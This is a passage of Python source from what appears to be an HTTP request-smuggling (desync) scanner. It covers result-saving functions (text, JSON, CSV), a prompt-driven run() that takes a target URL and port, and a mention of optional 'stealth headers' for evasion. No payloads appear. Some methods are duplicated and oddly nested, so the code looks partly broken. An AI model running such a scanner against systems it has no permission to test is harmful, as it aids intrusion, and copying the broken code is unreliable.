            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"desync_scan_results_{timestamp}.txt"
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write("HTTP DESYNC SCANNER RESULTS\n")
                f.write("=" * 80 + "\n")
                f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Target: {self.target_url}:{self.port}\n")
                f.write(f"Total Tests: {len(self.results)}\n")
                f.write("=" * 80 + "\n\n")
                
                # Target information
                f.write("TARGET INFORMATION:\n")
                f.write("-" * 40 + "\n")
                for key, value in self.target_info.items():
                    if isinstance(value, dict):
                        f.write(f"{key}:\n")
                        for subkey, subvalue in value.items():
                            f.write(f"  {subkey}: {subvalue}\n")
                    else:
                        f.write(f"{key}: {value}\n")
                f.write("\n")
                
                # Results
                f.write("DETAILED RESULTS:\n")
                f.write("-" * 40 + "\n")
                
                for i, result in enumerate(self.results, 1):
                    f.write(f"{i}. {result.payload_type} ({result.protocol})\n")
                    # Remove rich formatting for file output
                    status_clean = result.status.replace('[bold red]', '').replace('[/bold red]', '')
                    status_clean = status_clean.replace('[bold yellow]', '').replace('[/bold yellow]', '')
                    status_clean = status_clean.replace('[green]', '').replace('[/green]', '')
                    
                    conf_clean = result.confidence.replace('[red]', '').replace('[/red]', '')
                    conf_clean = conf_clean.replace('[yellow]', '').replace('[/yellow]', '')
                    conf_clean = conf_clean.replace('[green]', '').replace('[/green]', '')
                    
                    f.write(f"   Status: {status_clean}\n")
                    f.write(f"   Confidence: {conf_clean}\n") 
                    f.write(f"   Response Time: {result.response_time:.2f}s\n")
                    f.write(f"   Details: {result.details}\n")
                    f.write("\n")
            
            console.print(f"[green]✅ Results saved to: {filename}[/green]")
            
        except Exception as e:
            console.print(f"[red]❌ Failed to save results: {e}[/red]")
            
        def save_results_to_file(self):
            """Save scan results to formatted text, JSON, or CSV file"""
            try:
                # Create reports directory if it doesn't exist
                reports_dir = Path("../reports/desync_results")
                reports_dir.mkdir(parents=True, exist_ok=True)

                timestamp = time.strftime("%Y%m%d_%H%M%S")

                # Ask for format
                format_choice = Prompt.ask(
                    "[bold cyan]Choose output format[/bold cyan]",
                    choices=["json", "csv", "txt"],
                    default="json"
                )

                filename = reports_dir / f"desync_scan_results_{timestamp}.{format_choice}"

                if format_choice == "txt":
                    self._save_txt_file(filename)
                elif format_choice == "json":
                    self._save_json_file(filename)
                elif format_choice == "csv":
                    self._save_csv_file(filename)

                console.print(f"[green]✅ Results saved to: {filename}[/green]")

            except Exception as e:
                console.print(f"[red]❌ Failed to save results: {e}[/red]")

        def _save_txt_file(self, filename):
            """Save results as formatted text file"""
            with open(filename, 'w', encoding='utf-8') as f:
                    f.write("=" * 80 + "\n")
                    f.write("HTTP DESYNC SCANNER RESULTS\n")
                    f.write("=" * 80 + "\n")
                    f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Target: {self.target_url}:{self.port}\n")
                    f.write(f"Total Tests: {len(self.results)}\n")
                    f.write("=" * 80 + "\n\n")
                    
                    # Target information
                    f.write("TARGET INFORMATION:\n")
                    f.write("-" * 40 + "\n")
                    for key, value in self.target_info.items():
                        if isinstance(value, dict):
                            f.write(f"{key}:\n")
                            for subkey, subvalue in value.items():
                                f.write(f"  {subkey}: {subvalue}\n")
                        else:
                            f.write(f"{key}: {value}\n")
                    f.write("\n")
                    
                    # Results
                    f.write("DETAILED RESULTS:\n")
                    f.write("-" * 40 + "\n")
                    
                    for i, result in enumerate(self.results, 1):
                        f.write(f"{i}. {result.payload_type} ({result.protocol})\n")
                        # Remove rich formatting for file output
                        status_clean = result.status.replace('[bold red]', '').replace('[/bold red]', '')
                        status_clean = status_clean.replace('[bold yellow]', '').replace('[/bold yellow]', '')
                        status_clean = status_clean.replace('[green]', '').replace('[/green]', '')
                        
                        conf_clean = result.confidence.replace('[red]', '').replace('[/red]', '')
                        conf_clean = conf_clean.replace('[yellow]', '').replace('[/yellow]', '')
                        conf_clean = conf_clean.replace('[green]', '').replace('[/green]', '')
                        
                        f.write(f"   Status: {status_clean}\n")
                        f.write(f"   Confidence: {conf_clean}\n") 
                        f.write(f"   Response Time: {result.response_time:.2f}s\n")
                        f.write(f"   Details: {result.details}\n")
                        f.write("\n")


        def _save_json_file(self, filename):
            """Save results as JSON file"""
            results_data = {
                "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "target": f"{self.target_url}:{self.port}",
                "target_info": self.target_info,
                "results": [
                    {
                        "payload_type": result.payload_type,
                        "protocol": result.protocol,
                        "status": result.status.replace('[bold red]', '').replace('[/bold red]', '')
                                .replace('[bold yellow]', '').replace('[/bold yellow]', '')
                                .replace('[green]', '').replace('[/green]', ''),
                        "confidence": result.confidence.replace('[red]', '').replace('[/red]', '')
                                    .replace('[yellow]', '').replace('[/yellow]', '')
                                    .replace('[green]', '').replace('[/green]', ''),
                        "response_time": result.response_time,
                        "details": result.details
                    }
                    for result in self.results
                ]
            }

            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(results_data, f, indent=2, ensure_ascii=False)

        def _save_csv_file(self, filename):
            """Save results as CSV file"""
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow([
                    'Payload Type', 'Protocol', 'Status', 'Confidence',
                    'Response Time', 'Details'
                ])

                for result in self.results:
                    # Clean formatting for CSV
                    status_clean = result.status.replace('[bold red]', '').replace('[/bold red]', '')
                    status_clean = status_clean.replace('[bold yellow]', '').replace('[/bold yellow]', '')
                    status_clean = status_clean.replace('[green]', '').replace('[/green]', '')

                    conf_clean = result.confidence.replace('[red]', '').replace('[/red]', '')
                    conf_clean = conf_clean.replace('[yellow]', '').replace('[/yellow]', '')
                    conf_clean = conf_clean.replace('[green]', '').replace('[/green]', '')

                    writer.writerow([
                        result.payload_type,
                        result.protocol,
                        status_clean,
                        conf_clean,
                        f"{result.response_time:.2f}s",
                        result.details
                    ])        

# ============================================================================
# MAIN EXECUTION FUNCTION
# ============================================================================

def run():
    """
    Main execution function with enhanced user interface and error handling.
    """
    try:
        # Display welcome and gather target information
        console.print(Panel(
            "[bold green]HTTP Desync Tester - Configuration[/bold green]\n\n",
            border_style="green"
        ))
        
        # Target URL input with validation
        while True:
            target_url = Prompt.ask(
                "[bold cyan]Enter target URL[/bold cyan]",
                default="https://example.com"
            ).strip()
            
            if not target_url:
                console.print("[red]URL cannot be empty[/red]")
                continue
                
            if not (target_url.startswith("http://") or target_url.startswith("https://")):
                console.print("[red]URL must start with http:// or https://[/red]")
                continue
            
            break
        
        # Port input with smart defaults
        default_port = 443 if target_url.startswith("https://") else 80
        port = IntPrompt.ask(
            "[bold cyan]Enter port[/bold cyan]",
            default=default_port,
            show_default=True
        )
        
        # Custom headers (optional)
        headers = Prompt.ask(
            "[bold cyan]Custom headers[/bold cyan] (optional, format: key1:val1,key2:val2)",
            default="",
            show_default=False
        )
        
        # Advanced options
        console.print("\n[bold]Advanced Options:[/bold]")
        if RANDOMIZER_AVAILABLE:
            console.print("[green]✅ Stealth headers: Available[/green]")
        else:
            console.print("[yellow]⚠️ Stealth headers: Not available (randomizer.py not found)[/yellow]")
        
        # Create and run scanner
        smuggler = RequestSmuggler(target_url, port, headers)
        smuggler.run_full_scan()
        
    except KeyboardInterrupt:
        console.print("\n[yellow]👋 Scan cancelled by user[/yellow]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]❌ Fatal error: {e}[/red]")
        sys.exit(1)

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == '__main__':
    # Verify dependencies
    required_modules = ['httpx', 'rich']
    missing_modules = []
    
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            missing_modules.append(module)
    
    if missing_modules:
        print(f"Missing required modules: {', '.join(missing_modules)}")
        print("Install with: pip install " + " ".join(missing_modules))
        sys.exit(1)
    
    # Run the application
    run()